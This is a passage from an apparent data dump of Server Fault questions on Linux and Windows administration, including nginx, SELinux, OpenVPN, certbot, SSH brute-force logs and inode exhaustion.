Apr 08 16:00:43 AMCosyClub systemd[1]: Failed to start A high performance web server and a reverse proxy server.
</code></pre>

<p>Running <code>journalctl -xe</code> produces</p>

<pre><code>Apr 08 16:00:43 AMCosyClub nginx[8820]: nginx: configuration file /etc/nginx/nginx.conf test failed
Apr 08 16:00:43 AMCosyClub systemd[1]: nginx.service: Control process exited, code=exited status=1
Apr 08 16:00:43 AMCosyClub systemd[1]: nginx.service: Failed with result 'exit-code'.
Apr 08 16:00:43 AMCosyClub systemd[1]: Failed to start A high performance web server and a reverse proxy server.
-- Subject: Unit nginx.service has failed
-- Defined-By: systemd
-- Support: http://www.ubuntu.com/support
-- 
-- Unit nginx.service has failed.
-- 
-- The result is RESULT.
Apr 08 16:00:43 AMCosyClub sudo[8817]: pam_unix(sudo:session): session closed for user root
Apr 08 16:00:49 AMCosyClub systemd[1]: Started Run anacron jobs.
-- Subject: Unit anacron.service has finished start-up
-- Defined-By: systemd
-- Support: http://www.ubuntu.com/support
-- 
-- Unit anacron.service has finished starting up.
-- 
-- The start-up result is RESULT.
Apr 08 16:00:49 AMCosyClub anacron[8821]: Anacron 2.3 started on 2020-04-08
Apr 08 16:00:49 AMCosyClub anacron[8821]: Normal exit (0 jobs run)
Apr 08 16:02:26 AMCosyClub kernel: [UFW BLOCK] IN=wlp8s0 OUT= MAC=redacted SRC=redacted DST=redacted LEN=36 TOS=0x

[1]+  Stopped                 journalctl -xe
</code></pre>

<p>I have checked in the nginx error log and it repeats the following:</p>

<pre><code>[emerg] 8820#8820: directive ""root"" is not terminated by "";"" in /etc/nginx/conf.d/writefreely.conf:6
</code></pre>

<p>I'm a total novice when it comes to this stuff so any help would be greatly appreciated. Please let me know if I could provide any further details / run specific commands to help further clarify what is going on. THanks!</p>
","<ubuntu><nginx><networking><ubuntu-18.04>","2020-04-08 15:23:01"
"801379","Connect domain different cities","<p>How can i connect three server (domain controller) with a single one . These server are in different cities. And how to sync folder if i change file in one server automatically file change in other server</p>
","<windows><networking><windows-server-2008><windows-server-2008-r2>","2016-09-06 16:06:24"
"1011604","What are the drawbacks of getting a free domain name","<p>To configure a server, especially its email services, I'd need several <code>@serverdomainname.topdomain</code>.</p>

<p>I saw it is possible to pick some free domain names that would end in <code>.tk</code>, <code>.ga</code>, <code>.xyz</code>, etc.</p>

<p>I don't care about being well referenced by search engines.
<br>Knowing this, what are the drawbacks of using free registrars ?</p>

<p>The dual question would be : how these businesses survive?</p>

<p>Do not-self-signed SSL/TLS certificates cost more for ""exotic"" top domains than for ""classical"" ones (e.g <code>.com</code>) ?
<br>What is the bad consequence of a free domain name?</p>
","<nginx><domain-name-system><postfix><domain><subdomain>","2020-04-09 13:51:25"
"1011642","What is the difference between Consumer and Client SSD?","<p>Does anyone know what are the differences between Consumer and Client SSD :
<a href=""https://www.samsung.com/us/computing/memory-storage/solid-state-drives/ssd-970-pro-nvme-m2-1tb-mz-v7p1t0bw/"" rel=""nofollow noreferrer"">https://www.samsung.com/us/computing/memory-storage/solid-state-drives/ssd-970-pro-nvme-m2-1tb-mz-v7p1t0bw/</a> versus
<a href=""https://www.samsung.com/us/business/products/computing/ssd/client/970-pro-1tb-mz-v7p1t0e/"" rel=""nofollow noreferrer"">https://www.samsung.com/us/business/products/computing/ssd/client/970-pro-1tb-mz-v7p1t0e/</a></p>

<p><a href=""https://www.samsung.com/us/computing/memory-storage/solid-state-drives/ssd-860-pro-2-5--sata-iii-2tb-mz-76p2t0bw/"" rel=""nofollow noreferrer"">https://www.samsung.com/us/computing/memory-storage/solid-state-drives/ssd-860-pro-2-5--sata-iii-2tb-mz-76p2t0bw/</a> versus <a href=""https://www.samsung.com/us/business/products/computing/ssd/client/860-pro-2tb-mz-76p2t0e/"" rel=""nofollow noreferrer"">https://www.samsung.com/us/business/products/computing/ssd/client/860-pro-2tb-mz-76p2t0e/</a></p>
","<ssd>","2020-04-09 18:56:13"
"801546","Someone is trying to brute force SSH access to my server","<p>By coincidence I looked at my servers ssh log (/var/log/auth.log) and I noticed that someone is constantly trying to gain access: </p>

<pre><code>Sep  7 13:03:45 virt01 sshd[14674]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=116.31.116.42  user=root
Sep  7 13:03:48 virt01 sshd[14674]: Failed password for root from 116.31.116.42 port 13423 ssh2
Sep  7 13:03:52 virt01 sshd[14674]: message repeated 2 times: [ Failed password for root from 116.31.116.42 port 13423 ssh2]
Sep  7 13:03:52 virt01 sshd[14674]: Received disconnect from 116.31.116.42: 11:  [preauth]
</code></pre>

<p>This happens a few times every minute, and has been going on for a long time without me knowing about it. </p>

<p><strong>Question</strong> Should I be concerned about this, if yes: What should I do about it? </p>
","<ssh><hacking>","2016-09-07 11:14:18"
"1011667","Server recommendations for application API","<p>I currently have an application (API) hosted on a small server 1 GB RAM, 1 vCPU (Digital Ocean), the application read/writes to a MYSQL database which is also hosted on the same server.</p>

<p>I expect that the server will receive a huge POST requests soon, nearly 50K request per hour. </p>

<p>So the questions are, What do is your recommendation on upgrading the server? </p>

<p>Should I use a dedicated server for database? Should I use NGINX or Apache?, Is there custom settings needs to be done on the web server?; ex max concurrent connections, connection pool ..etc</p>

<p>Thank you</p>
","<nginx><apache-2.4><configuration><infrastructure>","2020-04-09 22:04:02"
"1011763","SSL certificate on Google cloud","<p>Hello ,</p>

<p>We have setup a Google Cloud VM .
We need to install SSL certificate in order to make sure we use secure connection.
Can you please guide us on do you provide a SSL certificate or we need to purchase it from other sources</p>
","<google-cloud-platform>","2020-04-10 15:14:22"
"801636","Centos openssl vulnerability high OpenSSL Running Version Prior to 1.0.1t","<p>I have run a security check and it came back with 6 high vulnerabilities.</p>

<pre><code>OpenSSL Running Version Prior to 1.0.1t
OpenSSL Running Version Prior to 1.0.1t
OpenSSL Running Version Prior to 1.0.1o
OpenSSL Running Version Prior to 1.0.1o
OpenSSL Running Version Prior to 1.0.1s (DROWN)
OpenSSL Running Version Prior to 1.0.1s (DROWN)
</code></pre>

<p>I am here as a last result (i have googled) so many conflicting articles on updating i was really hoping the cmd.</p>

<pre><code>yum update openssl
</code></pre>

<p>Would solve my issue but no help i get.</p>

<pre><code>Loaded plugins: priorities, update-motd, upgrade-helper
amzn-main/latest                                         | 2.1 kB     00:00     
amzn-updates/latest                                      | 2.3 kB     00:00     
1521 packages excluded due to repository priority protections
No packages marked for update
</code></pre>

<p>I have seen a few articles about building from src and then articles saying you should definitively not do this what is right I really want to make sure my server is secure.</p>

<p>My openssl version is: OpenSSL 1.0.1k-fips 8 Jan 2015</p>

<p>I am running centos on AWS ec2 any idea how to update? this does not help <a href=""https://aws.amazon.com/premiumsupport/knowledge-center/openssl/"" rel=""nofollow noreferrer"">https://aws.amazon.com/premiumsupport/knowledge-center/openssl/</a></p>

<p>Please help.</p>
","<centos><amazon-ec2><openssl>","2016-09-07 15:36:24"
"801672","DNS resolution on OpenVPN server","<p>I am running virtual server with Windows Server 2012 R2 for RDS purpose mostly. OpenVPN server is installed on this host as well. Firewall is configured in a way that RDP connections could only be made from VPN network. But now to access RDP users have to type server's VPN ip (like 10.8.0.1), instead of using friendly DNS name (I have a domain registered). What would be the simplest way to bind a hostname to this ip? Changing host's file on each client machine is obviously not an option. Thanks in advance.</p>
","<windows><domain-name-system><openvpn><rds>","2016-09-07 19:00:48"
"801716","SELinux prevents Nginx from reading file","<p>I have nginx running on my CentOS 7 machine. Every day I run a cron job that generates new Diffie-Hellman parameters. They are saved in <code>/etc/ssl/dh/dhparam.pem</code>. But SELinux is preventing nginx from reading this file.</p>

<p>This is the line in the nginx error log:</p>

<p><code>nginx[3189]: nginx: [emerg] BIO_new_file(""/etc/ssl/dh/dhparam.pem"") failed (SSL: error:0200100D:system library:fopen:Permission denied:fopen('/etc/ssl/dh/dhparam.pem','r') error:2006D002:BIO routines:BIO_new_file:system lib)</code></p>

<p>This is the audit log:</p>

<pre><code>type=AVC msg=audit(1473285202.181:334): avc:  denied  { open } for  pid=1393 comm=""nginx"" path=""/etc/ssl/dh/dhparam.pem"" dev=""dm-1"" ino=101646309 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:user_tmp_t:s0 tclass=file
type=AVC msg=audit(1473285832.647:743): avc:  denied  { open } for  pid=2958 comm=""nginx"" path=""/etc/ssl/dh/dhparam.pem"" dev=""dm-1"" ino=101646309 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:user_tmp_t:s0 tclass=file
type=AVC msg=audit(1473287010.821:803): avc:  denied  { open } for  pid=3083 comm=""nginx"" path=""/etc/ssl/dh/dhparam.pem"" dev=""dm-1"" ino=101646316 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:user_tmp_t:s0 tclass=file
type=AVC msg=audit(1473287142.871:826): avc:  denied  { open } for  pid=3118 comm=""nginx"" path=""/etc/ssl/dh/dhparam.pem"" dev=""dm-1"" ino=101646309 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:user_tmp_t:s0 tclass=file
type=AVC msg=audit(1473287172.480:843): avc:  denied  { open } for  pid=3134 comm=""nginx"" path=""/etc/ssl/dh/dhparam.pem"" dev=""dm-1"" ino=101646309 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:user_tmp_t:s0 tclass=file
type=AVC msg=audit(1473287681.994:866): avc:  denied  { open } for  pid=3189 comm=""nginx"" path=""/etc/ssl/dh/dhparam.pem"" dev=""dm-1"" ino=101646309 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:user_tmp_t:s0 tclass=file
</code></pre>

<p>I'm not very familiar with SELinux (I know I should learn that): How can I grant nginx access without disabeling SELinux (or setting it to permissive)? </p>
","<nginx><centos><selinux>","2016-09-07 23:44:46"
"801761","ext4: Running out of inodes","<p>I am running out of inodes. Only <strong>11%</strong> available:</p>

<pre><code>the-foo:~ # df -i 
Filesystem               Inodes   IUsed   IFree IUse% Mounted on
/dev/mapper/system-home 9830400 8702297 1128103   89% /home
</code></pre>

<p>Is there a way to solve this without creating and copying to a new partition?</p>

<p>Details:</p>

<pre><code>the-foo:~ # tune2fs -l /dev/mapper/system-home
tune2fs 1.42.6 (21-Sep-2012)
Filesystem volume name:   &lt;none&gt;
Last mounted on:          /home
Filesystem UUID:          55899b65-15af-437d-ac56-d323c702f305
Filesystem magic number:  0xEF53
Filesystem revision #:    1 (dynamic)
Filesystem features:      has_journal ext_attr resize_inode dir_index filetype needs_recovery extent flex_bg sparse_super large_file huge_file uninit_bg dir_nlink extra_isize
Filesystem flags:         signed_directory_hash 
Default mount options:    user_xattr acl
Filesystem state:         clean
Errors behavior:          Continue
Filesystem OS type:       Linux
Inode count:              9830400
Block count:              39321600
Reserved block count:     1966080
Free blocks:              22958937
Free inodes:              2706313
First block:              0
Block size:               4096
Fragment size:            4096
Reserved GDT blocks:      1014
Blocks per group:         32768
Fragments per group:      32768
Inodes per group:         8192
Inode blocks per group:   512
Flex block group size:    16
Filesystem created:       Tue Jul  8 08:02:22 2014
Last mount time:          Sun Apr 24 22:33:00 2016
Last write time:          Thu Sep  8 09:18:01 2016
Mount count:              11
Maximum mount count:      10
Last checked:             Tue Jul  8 08:02:22 2014
Check interval:           0 (&lt;none&gt;)
Lifetime writes:          349 GB
Reserved blocks uid:      0 (user root)
Reserved blocks gid:      0 (group root)
First inode:              11
Inode size:           256
Required extra isize:     28
Desired extra isize:      28
Journal inode:            8
First orphan inode:       2759586
Default directory hash:   half_md4
Directory Hash Seed:      e4402d28-9b15-46e2-9521-f0e25dfb58d0
Journal backup:           inode blocks
</code></pre>

<p>Please let me know if more details are needed.</p>
","<linux><filesystems><ext4><inode>","2016-09-08 07:30:03"
"1011985","Guest VM in Virtualbox connected to a vpn while the host machine is not?","<p>Is it possible to have a guest VM in Virtualbox connected to a vpn while the host machine is not? If so, what specific network adapter configurations do I need to setup/add in the virtual box vm settings?</p>
","<vpn><virtual-machines><virtualbox>","2020-04-12 12:49:01"
"1012056","WAN connection is too slow on GCP compute instances","<p>Yesterday I launched a new GCP instance which has about 15G RAM and 4CPU, I found Internet speed on the server is very slow! so I though to measure speed using speedtest-cli and found the connection is too slow, my mobile phone has a better Internet speed,
Retrieving speedtest.net server list...
Selecting best server based on ping...
Hosted by Bridge-Telecom, Ltd (Yakutsk) [8129.74 km]: 471.518 ms
Testing download speed................................................................................
Download: 7.72 Mbit/s
Testing upload speed................................................................................................
Upload: 3.06 Mb
The location of server is in SG, so I though to create another VM in Mumbai and test out, same result! GCP support costly so I can't connact them, can anybody explain to me what may be the issue? 
I chose default GCP Centos 8 image for these VM and didn't modify anything and chose premium network!</p>
","<google-compute-engine>","2020-04-13 04:36:46"
"801906","cant access tty:job control turned off After dist-upgrade","<p>i cannot boot my server anymore</p>

<p><a href=""https://i.sstatic.net/ItrBC.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/ItrBC.png"" alt=""enter image description here""></a></p>

<p>what is the problem
plz help</p>
","<debian><tty>","2016-09-08 15:46:40"
"801983","Limit who can access a folder in Windows, including encryption & administration","<p>We want to keep our HR files on a share that only 3 people in HR can access. I'd prefer to do this on a share on our file server on a Windows box.</p>

<ol>
<li>We need the files to be encrypted so that someone ont he file server can't view them.</li>
<li>Determining who can access the share needs to be controlled solely by me. So not even a root admin can change who has access.</li>
</ol>

<p>Is there a way to do this? Or should I get a DropBox account for the 3 of them?</p>

<p>thanks - dave</p>
","<network-share><encryption><file-sharing>","2016-09-08 22:25:21"
"801986","Hide protocol in URL with Nginx?","<p>I recently configured HTTPS on my Nginx server, however I think showing the protocol in the URL ( <code>http</code> / <code>https</code> ) is ugly. I was curious if there was a way for me to hide the protocol in the address bar, while still maintaining HTTPS security under the hood.</p>

<p>currently my URL looks like:
<code>https://example.com</code>
but I want it to look like <code>example.com</code>.</p>

<p>Any input much appreciated!</p>
","<nginx><rewrite><https>","2016-09-08 23:08:42"
"1012218","Letsencrypt for all subdomains *.example.com","<p>I'd like to obtain one certificate working for all my subdomains <code>*.example.com</code>.</p>

<p>This works: </p>

<pre><code>certbot-auto certonly --webroot --webroot-path /home/www/example/ --domain example.com 
                                --domain www.example.com --email certbot@example.com
</code></pre>

<p>but this (with  <code>*.</code>):</p>

<pre><code>certbot-auto certonly --webroot --webroot-path /home/www/example/ --domain example.com 
                                --domain *.example.com --email certbot@example.com
</code></pre>

<p>fails with:</p>

<blockquote>
  <p>Obtaining a new certificate<br>
  Performing the following challenges:<br>
  Client with the currently selected authenticator does not support any combination of challenges that will satisfy the CA. You may need to use an authenticator plugin that can do challenges over DNS.  </p>
</blockquote>

<p><strong>How to use <code>certbot-auto</code> to generate a certificate for <code>*.example.com</code>?</strong></p>
","<ssl-certificate><https><lets-encrypt><certbot>","2020-04-14 09:23:42"
"802000","Compatibility of Nvidia's Tesla K80 GPU on Sun Solaris Sunfire X4270","<p>I would like to fix Nvidia's Tesla K80 GPU on Sun Solaris server Sunfire X4270. If someone know how to check the compatibility, it would be great help !</p>
","<nvidia>","2016-09-09 01:45:27"
"1012573","How can python's os.system([command]) bypass the history record?","<p>I mean, how <em>dare</em> it?
These two scripts have different record in history (at least by history command)</p>

<pre><code># echo ""hello""
</code></pre>

<p>the direct command in shell will result in a record in history, however if I execute it inside python</p>

<pre><code># python
# import os
# os.system(""echo 'hello'"")
</code></pre>

<p>However, the second way of executing a shell script bypass the history record. And can I find the echo command from python somewhere on Linux?</p>
","<linux><python><history>","2020-04-16 12:53:42"
"802356","Is it safe to use the EPEL repository on CentOS systems?","<p>I recently submitted a Puppet patch which would have enabled the EPEL repository on a number of our CentOS 7 systems (I need this in order to install Python 3).</p>

<p>One of the sysadmins rejected the patch, claiming that EPEL is not safe, and can conflict with the base repository packages. I was told that EPEL can make determining ""which package will be available on which node somewhat unpredictable.""</p>

<p>I am a software developer now, but I was a full-time sysadmin from 1995 to 2013. I have never heard about this kind of conflict before, and asking a few friends about it, none of them have either.</p>

<p>So my question is: can EPEL conflict with the stock/base CentOS 7 repositories? Is there any documentation out there of this happening? I didn't find anything when searching online, except a couple of statements indicating exactly the opposite.</p>

<p><a href=""https://fedoraproject.org/wiki/EPEL/FAQ#Does_EPEL_replace_packages_provided_within_Red_Hat_Enterprise_Linux_or_layered_products.3F"" rel=""nofollow noreferrer"">Does EPEL replace packages provided within Red Hat Enterprise Linux or layered products?</a></p>

<p><a href=""https://fedoraproject.org/wiki/EPEL/GuidelinesAndPolicies#Policy_for_Conflicting_Packages"" rel=""nofollow noreferrer"">(Fedora Project) Policy for Conflicting Packages</a></p>
","<centos><yum><epel>","2016-09-11 01:39:43"
"802394","Self-hosted alternatives to VNC that don't require a static IP?","<p>I was trying to set up a VNC server on my parent's laptops, so that I could provide remote assistance. I logged in (via Chrome Remote Desktop), installed TightVNC and set up port forwarding on the router, but could not connect to it. After a bunch of googling around, I discovered that the issue was the ISP was not assigning them a static IP (router's WAN ip address was 172.17.xx.xx).</p>

<p>Is there anything I can self-host that will let me access their machine remotely? (That is, I want to install some sort of server on my own box, which does have a static ip, and then a client on their laptops that will let me log in remotely, along the lines of logmein/teamviewer/etc but self-hosted)</p>
","<networking>","2016-09-11 11:32:12"
"802509","Tool which checks that security best practices are in place","<p>I want to secure my servers more, and so was wondering if there were any great tool to help me tighten the security on linux machines (or more specifically debian).</p>

<p>For exemple, this tool (or collection of tools, but I'd rather have something simple and to the point) would :</p>

<ul>
<li>raise a warning if <code>ssh</code> accepts password auth</li>
<li>raise errors if outdated libraries and programs known to have big security holes are installed/used...</li>
<li>if <code>apache</code>/<code>nginx</code>/whatever is installed, raise warnings and/or errors if the confs are not secure enough, or to advise installing this or that module for better security, ...</li>
<li>raise errors if common programs can be accessed with the default user/pwd</li>
<li>optionally : list programs which receive and send data, on which ports (handy to find rogue programs)</li>
<li>optionally : give security best practice advice, depending on the software installed on the server.</li>
<li>...</li>
</ul>

<p>Server security is a big subject, and without such a tool I think only the most experienced sysadmins can make a server really secure (and even them must forget some important conf change from time to time).</p>

<p><strong>Ideally, this tool would be run from the command line and display clear errors and warnings so that I could make the required changes and run the tool until everything is ok.</strong></p>
","<linux><security><debian><firewall><linux-networking>","2016-09-12 08:55:22"
"1012816","Bad Mask /29 for address 172.24.59.0 255.255.255.248 cisco packet tracer","<p>I received this error Bad Mask /29 for address 172.24.59.0  255.255.255.248  Why was this error produced?</p>

<p>and what is the valid host range for the 255.255.255.248 subnet?</p>

<p>would the correct answer for the first part be because the correct IP address should be 172.24.59.1 255.255.255.248  ???</p>

<p>and part 2
172.24.59.1 - 172.24.59.6</p>
","<linux><unix>","2020-04-17 17:03:44"
"802549","Have set up OpenVPN server on Google Cloud Engine. Can't access machine after restart","<p>I'm trying to set up an OpenVPN server on Google Cloud Engine. I have followed this guide:</p>

<p><a href=""https://www.digitalocean.com/community/tutorials/how-to-set-up-an-openvpn-server-on-ubuntu-16-04"" rel=""nofollow noreferrer"">https://www.digitalocean.com/community/tutorials/how-to-set-up-an-openvpn-server-on-ubuntu-16-04</a></p>

<p>Everything works as long as I don't stop the machine. I can create client certificates and connect to the VPN from the clients.</p>

<p>But, <strong>if I stop and restart the machine, I can't access the machine anymore. I can't VPN through it, I can't ssh into it, I can't even ping it</strong>.</p>

<p>I have tried restarting the server after every step in the guide to see where the problem occurs. The problem occurs after the following command (step 7 in the guide):</p>

<pre><code>gunzip -c /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz | sudo tee /etc/openvpn/server.conf
</code></pre>

<p>Here is my <code>server.conf</code>:</p>

<pre><code>#################################################
# Sample OpenVPN 2.0 config file for            #
# multi-client server.                          #
#                                               #
# This file is for the server side              #
# of a many-clients &lt;-&gt; one-server              #
# OpenVPN configuration.                        #
#                                               #
# OpenVPN also supports                         #
# single-machine &lt;-&gt; single-machine             #
# configurations (See the Examples page         #
# on the web site for more info).               #
#                                               #
# This config should work on Windows            #
# or Linux/BSD systems.  Remember on            #
# Windows to quote pathnames and use            #
# double backslashes, e.g.:                     #
# ""C:\\Program Files\\OpenVPN\\config\\foo.key"" #
#                                               #
# Comments are preceded with '#' or ';'         #
#################################################

# Which local IP address should OpenVPN
# listen on? (optional)
;local a.b.c.d

# Which TCP/UDP port should OpenVPN listen on?
# If you want to run multiple OpenVPN instances
# on the same machine, use a different port
# number for each one.  You will need to
# open up this port on your firewall.
port 1194

# TCP or UDP server?
;proto tcp
proto udp

# ""dev tun"" will create a routed IP tunnel,
# ""dev tap"" will create an ethernet tunnel.
# Use ""dev tap0"" if you are ethernet bridging
# and have precreated a tap0 virtual interface
# and bridged it with your ethernet interface.
# If you want to control access policies
# over the VPN, you must create firewall
# rules for the the TUN/TAP interface.
# On non-Windows systems, you can give
# an explicit unit number, such as tun0.
# On Windows, use ""dev-node"" for this.
# On most systems, the VPN will not function
# unless you partially or fully disable
# the firewall for the TUN/TAP interface.
;dev tap
dev tun

# Windows needs the TAP-Win32 adapter name
# from the Network Connections panel if you
# have more than one.  On XP SP2 or higher,
# you may need to selectively disable the
# Windows firewall for the TAP adapter.
# Non-Windows systems usually don't need this.
;dev-node MyTap

# SSL/TLS root certificate (ca), certificate
# (cert), and private key (key).  Each client
# and the server must have their own cert and
# key file.  The server and all clients will
# use the same ca file.
#
# See the ""easy-rsa"" directory for a series
# of scripts for generating RSA certificates
# and private keys.  Remember to use
# a unique Common Name for the server
# and each of the client certificates.
#
# Any X509 key management system can be used.
# OpenVPN can also use a PKCS #12 formatted key file
# (see ""pkcs12"" directive in man page).
ca ca.crt
cert server.crt
key server.key  # This file should be kept secret

# Diffie hellman parameters.
# Generate your own with:
#   openssl dhparam -out dh2048.pem 2048
dh dh2048.pem

# Network topology
# Should be subnet (addressing via IP)
# unless Windows clients v2.0.9 and lower have to
# be supported (then net30, i.e. a /30 per client)
# Defaults to net30 (not recommended)
;topology subnet

# Configure server mode and supply a VPN subnet
# for OpenVPN to draw client addresses from.
# The server will take 10.8.0.1 for itself,
# the rest will be made available to clients.
# Each client will be able to reach the server
# on 10.8.0.1. Comment this line out if you are
# ethernet bridging. See the man page for more info.
server 10.8.0.0 255.255.255.0

# Maintain a record of client &lt;-&gt; virtual IP address
# associations in this file.  If OpenVPN goes down or
# is restarted, reconnecting clients can be assigned
# the same virtual IP address from the pool that was
# previously assigned.
ifconfig-pool-persist ipp.txt

# Configure server mode for ethernet bridging.
# You must first use your OS's bridging capability
# to bridge the TAP interface with the ethernet
# NIC interface.  Then you must manually set the
# IP/netmask on the bridge interface, here we
# assume 10.8.0.4/255.255.255.0.  Finally we
# must set aside an IP range in this subnet
# (start=10.8.0.50 end=10.8.0.100) to allocate
# to connecting clients.  Leave this line commented
# out unless you are ethernet bridging.
;server-bridge 10.8.0.4 255.255.255.0 10.8.0.50 10.8.0.100

# Configure server mode for ethernet bridging
# using a DHCP-proxy, where clients talk
# to the OpenVPN server-side DHCP server
# to receive their IP address allocation
# and DNS server addresses.  You must first use
# your OS's bridging capability to bridge the TAP
# interface with the ethernet NIC interface.
# Note: this mode only works on clients (such as
# Windows), where the client-side TAP adapter is
# bound to a DHCP client.
;server-bridge

# Push routes to the client to allow it
# to reach other private subnets behind
# the server.  Remember that these
# private subnets will also need
# to know to route the OpenVPN client
# address pool (10.8.0.0/255.255.255.0)
# back to the OpenVPN server.
;push ""route 192.168.10.0 255.255.255.0""
;push ""route 192.168.20.0 255.255.255.0""

# To assign specific IP addresses to specific
# clients or if a connecting client has a private
# subnet behind it that should also have VPN access,
# use the subdirectory ""ccd"" for client-specific
# configuration files (see man page for more info).

# EXAMPLE: Suppose the client
# having the certificate common name ""Thelonious""
# also has a small subnet behind his connecting
# machine, such as 192.168.40.128/255.255.255.248.
# First, uncomment out these lines:
;client-config-dir ccd
;route 192.168.40.128 255.255.255.248
# Then create a file ccd/Thelonious with this line:
#   iroute 192.168.40.128 255.255.255.248
# This will allow Thelonious' private subnet to
# access the VPN.  This example will only work
# if you are routing, not bridging, i.e. you are
# using ""dev tun"" and ""server"" directives.

# EXAMPLE: Suppose you want to give
# Thelonious a fixed VPN IP address of 10.9.0.1.
# First uncomment out these lines:
;client-config-dir ccd
;route 10.9.0.0 255.255.255.252
# Then add this line to ccd/Thelonious:
#   ifconfig-push 10.9.0.1 10.9.0.2

# Suppose that you want to enable different
# firewall access policies for different groups
# of clients.  There are two methods:
# (1) Run multiple OpenVPN daemons, one for each
#     group, and firewall the TUN/TAP interface
#     for each group/daemon appropriately.
# (2) (Advanced) Create a script to dynamically
#     modify the firewall in response to access
#     from different clients.  See man
#     page for more info on learn-address script.
;learn-address ./script

# If enabled, this directive will configure
# all clients to redirect their default
# network gateway through the VPN, causing
# all IP traffic such as web browsing and
# and DNS lookups to go through the VPN
# (The OpenVPN server machine may need to NAT
# or bridge the TUN/TAP interface to the internet
# in order for this to work properly).
;push ""redirect-gateway def1 bypass-dhcp""

# Certain Windows-specific network settings
# can be pushed to clients, such as DNS
# or WINS server addresses.  CAVEAT:
# http://openvpn.net/faq.html#dhcpcaveats
# The addresses below refer to the public
# DNS servers provided by opendns.com.
;push ""dhcp-option DNS 208.67.222.222""
;push ""dhcp-option DNS 208.67.220.220""

# Uncomment this directive to allow different
# clients to be able to ""see"" each other.
# By default, clients will only see the server.
# To force clients to only see the server, you
# will also need to appropriately firewall the
# server's TUN/TAP interface.
;client-to-client

# Uncomment this directive if multiple clients
# might connect with the same certificate/key
# files or common names.  This is recommended
# only for testing purposes.  For production use,
# each client should have its own certificate/key
# pair.
#
# IF YOU HAVE NOT GENERATED INDIVIDUAL
# CERTIFICATE/KEY PAIRS FOR EACH CLIENT,
# EACH HAVING ITS OWN UNIQUE ""COMMON NAME"",
# UNCOMMENT THIS LINE OUT.
;duplicate-cn

# The keepalive directive causes ping-like
# messages to be sent back and forth over
# the link so that each side knows when
# the other side has gone down.
# Ping every 10 seconds, assume that remote
# peer is down if no ping received during
# a 120 second time period.
keepalive 10 120

# For extra security beyond that provided
# by SSL/TLS, create an ""HMAC firewall""
# to help block DoS attacks and UDP port flooding.
#
# Generate with:
#   openvpn --genkey --secret ta.key
#
# The server and each client must have
# a copy of this key.
# The second parameter should be '0'
# on the server and '1' on the clients.
tls-auth ta.key 0 # This file is secret
key-direction 0

# Select a cryptographic cipher.
# This config item must be copied to
# the client config file as well.
;cipher BF-CBC        # Blowfish (default)
cipher AES-128-CBC   # AES
;cipher DES-EDE3-CBC  # Triple-DES
auth SHA256

# Enable compression on the VPN link.
# If you enable it here, you must also
# enable it in the client config file.
comp-lzo

# The maximum number of concurrently connected
# clients we want to allow.
;max-clients 100

# It's a good idea to reduce the OpenVPN
# daemon's privileges after initialization.
#
# You can uncomment this out on
# non-Windows systems.
user nobody
group nogroup

# The persist options will try to avoid
# accessing certain resources on restart
# that may no longer be accessible because
# of the privilege downgrade.
persist-key
persist-tun

# Output a short status file showing
# current connections, truncated
# and rewritten every minute.
status openvpn-status.log

# By default, log messages will go to the syslog (or
# on Windows, if running as a service, they will go to
# the ""\Program Files\OpenVPN\log"" directory).
# Use log or log-append to override this default.
# ""log"" will truncate the log file on OpenVPN startup,
# while ""log-append"" will append to it.  Use one
# or the other (but not both).
;log         openvpn.log
;log-append  openvpn.log

# Set the appropriate level of log
# file verbosity.
#
# 0 is silent, except for fatal errors
# 4 is reasonable for general usage
# 5 and 6 can help to debug connection problems
# 9 is extremely verbose
verb 3

# Silence repeating messages.  At most 20
# sequential messages of the same message
# category will be output to the log.
;mute 20
</code></pre>

<p>Most of the steps in the guide I have been following are unfortunately a bit over my head. I have tried changing <code>proto udp</code> to <code>proto tcp</code> and <code>dev tun</code> to <code>dev tap</code>. But that hasn't helped. Regardless of those settings, the machine has become unaccessible after restart.</p>

<p>I have enabled IP forwarding and added a network rule in the Google Cloud Console:</p>

<pre><code>source tag / IP range: 0.0.0.0/0, allowed protocols/ports: udp:1194; tcp:1194
</code></pre>

<p><strong>What can I change to make the machine accessible after restart?</strong></p>
","<openvpn><google-compute-engine>","2016-09-12 12:21:09"
"802633","Can't use remote desktop to restart the server Windows server 2016","<p>I have a windows server 2016 that I can't access through RD... I usually can but it's for some reason I get stuck on ""Securing remote connection"" 
<a href=""https://support.microsoft.com/sv-se/kb/2915774"" rel=""nofollow noreferrer"">https://support.microsoft.com/sv-se/kb/2915774</a></p>

<p>I want to restart the server computer, the server is up and running, and the website too. How can I restart it with for example RD credentials?</p>
","<windows-server-2016>","2016-09-12 18:20:28"
"802672","LAMP/ webdav: my apache error.logs show ""su: must be run from a terminal"" - but that wasnt me","<p>within the apache error.log I have the mssg:
""su: must be run from a terminal""
Usually, there are error IDs, the monitored IP and source of the error (php-page)  - all this is missing here.</p>

<p>If I check the apache access.log during the given time-window (the error-mssg before and that one after the entry ""su: must be run from a terminal""), there is a hacking-approach: 
PROPFIND /webdav/ HTTP/1.1"" 403 0 ""-"" ""WEBDAV Client""
(the IP is already listed in the abuse IP database.list:  <a href=""https://www.abuseipdb.com/check/192.99.144.140"" rel=""nofollow noreferrer"">https://www.abuseipdb.com/check/192.99.144.140</a>)</p>

<p>Now I wonder, if the ""<strong>su: must be run from a terminal</strong>"" is normal behaviour if the PROPFIND was rejected properly - or, <strong>if this a clear sign that there is a critical vulnerability</strong>. (I have never added/ activated/ used the webdav module for this server.)</p>

<p>I'd be happy if someone could explain/give further information, where/how this plain mssg ""su: must be run from a terminal"" is coming from/was generated by.</p>
","<lamp><webdav><vulnerability><mod-webdav>","2016-09-12 21:31:52"
"1013008","Extract missing paths from bash array of paths","<p>I have an array of paths:</p>

<pre class=""lang-sh prettyprint-override""><code>paths=(
  /foo/exists1
  /foo/exists2
  /foo/missing1
)
</code></pre>

<p>To find those that are missing:</p>

